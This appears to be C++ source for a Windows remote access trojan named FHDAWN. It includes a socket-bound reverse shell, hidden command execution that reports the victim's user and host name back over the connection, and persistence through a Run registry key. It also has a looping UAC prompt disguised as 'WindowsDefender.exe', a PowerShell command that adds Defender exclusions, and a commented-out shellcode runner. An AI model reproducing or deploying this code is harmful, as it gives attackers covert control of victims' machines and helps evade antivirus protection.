#include "fhdawn.h"

BOOL FHDAWN::isFile(const char* file)
{
	DWORD dwAttrib = GetFileAttributes(file);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES && 
			!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

std::streampos FHDAWN::filesize( const char* filePath ){

    std::streampos fsize = 0;
    std::ifstream file( filePath, std::ios::binary );

    fsize = file.tellg();
    file.seekg( 0, std::ios::end );
    fsize = file.tellg() - fsize;
    file.close();

    return fsize;
}

void FHDAWN::ReverseShell(const char* command)
{
	// char cmd[500];
	// memset(cmd, '\0', 500);
	// snprintf(cmd, 500, "%s", command, output_filename);
	STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) sockfd;
	if(CreateProcess(NULL, (LPSTR)command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
		WaitForSingleObject(pinfo.hProcess, INFINITE);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}
}

void FHDAWN::ExecuteSilent(const char* command)
{
	char cmd[500];
	memset(cmd, '\0', 500);
	snprintf(cmd, 500, "%s", command);
	STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	CreateProcess(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
	WaitForSingleObject(pinfo.hProcess, INFINITE);
	CloseHandle(pinfo.hProcess);
	CloseHandle(pinfo.hThread);
	//return readFileContents("output");
}

void FHDAWN::ExecuteArgs(const char* file, const char* args)
{
	std::ostringstream reply;
	PROCESS_INFORMATION pinfo; 
	char cmdArgs[500];
	memset(cmdArgs, '\0', 500);
	snprintf(cmdArgs, 500, "%s %s", args);
	STARTUPINFO sinfo; 
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
    reply.str("");
	reply.clear();
	if(!CreateProcess((LPCSTR)file, cmdArgs, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
		reply << "Create Process Error Code : " << GetLastError();
		send_data(reply.str()); 
	} else {
        reply << "Executed '" << file << "' on " << UserPC() << " successfully with '" << args << "'." ;
		send_data(reply.str());
	}

	CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}

// void FHDAWN::ExecuteShellCode(char b[])
// {
// 	void *exec = VirtualAlloc(0, sizeof(b), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//     memcpy(exec, b, sizeof(b));
//     ((void(*)())exec)();
// }

void FHDAWN::Execute(const char* file)
{
    std::ostringstream reply;
	PROCESS_INFORMATION pinfo; 
	STARTUPINFO sinfo; 
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
    reply.str("");
	reply.clear();
	if(!CreateProcess((LPCSTR)file, NULL, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
		reply << "Create Process Error Code : " << GetLastError();
		send_data(reply.str()); 
	} else {
        reply << "Executed '" << file << "' on " << UserPC() << " successfully.";
		send_data(reply.str());
	}

	CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}


std::string FHDAWN::UserPC()
{
	char username[UNLEN + 1];
	char hostname[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD len = UNLEN + 1;
	DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
	std::string userpc;
	GetUserNameA(username, &len);
	GetComputerNameA(hostname, &hlen);
	userpc = std::string(username) + " / " + std::string(hostname);
	return userpc;
}


void FHDAWN::copyFile(const char* source, const char* dest)
{
	std::ifstream  src(source, std::ios::binary);
	std::ofstream  dst(dest, std::ios::binary);
	dst << src.rdbuf();
}

void FHDAWN::StartupKey(const char* czExePath)
{
	HKEY hKey;
	TCHAR DIR[MAX_PATH];
	LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
								_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
								0 , KEY_WRITE,
								&hKey);
	if( ERROR_SUCCESS == lnRes )
	{   
		lnRes = RegSetValueEx(  hKey,
								_T("WinFHDawn"),
								0,
								REG_SZ,
								(unsigned char*)czExePath,
								strlen(czExePath) );
	}

	RegCloseKey(hKey);
}


BOOL FHDAWN::IsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(&NtAuthority, 2,
                                  SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        dwError = GetLastError();

    } else if (!CheckTokenMembership(NULL, pAdministratorsGroup,
                                     &fIsRunAsAdmin)) {
        dwError = GetLastError();

    }

    if (pAdministratorsGroup) {
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }

    if (ERROR_SUCCESS != dwError) {
        throw dwError;
    }

    return fIsRunAsAdmin;
}

void UACTrigger() {
	FHDAWN f;
    BOOL isalreadyadmin = FALSE;
    try {
        isalreadyadmin = f.IsAdmin();
    }
    catch (...) {

    }
    if (!isalreadyadmin) {

		SHELLEXECUTEINFO sei = {sizeof(sei)};

		sei.lpVerb = "runas";
		sei.lpFile = "WindowsDefender.exe";
		sei.hwnd = NULL;
		sei.nShow = SW_HIDE;

		if (!ShellExecuteEx(&sei)) {
			DWORD dwError = GetLastError();
			if (dwError == ERROR_CANCELLED)
			CreateThread(0, 0, (LPTHREAD_START_ROUTINE) UACTrigger, 0, 0, 0);
        }
    } 
}

DWORD FHDAWN::ProcessId(LPCTSTR ProcessName)
{
    PROCESSENTRY32 pt;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pt.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hsnap, &pt)) { 
        do {
            if (!lstrcmpi(pt.szExeFile, ProcessName)) {
                CloseHandle(hsnap);
                return pt.th32ProcessID;
            }
        } while (Process32Next(hsnap, &pt));
    }
    CloseHandle(hsnap); 
    return 0;
}

void FHDAWN::AddExclusion(const char* path)
{
    char command [500] = {0};
	memset(command, '\0', 500);
    snprintf(command, 500, "cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%s'", path);
	if(connected)
	{
		ReverseShell(command);
	} else {
		ExecuteSilent(command);
	}
    
}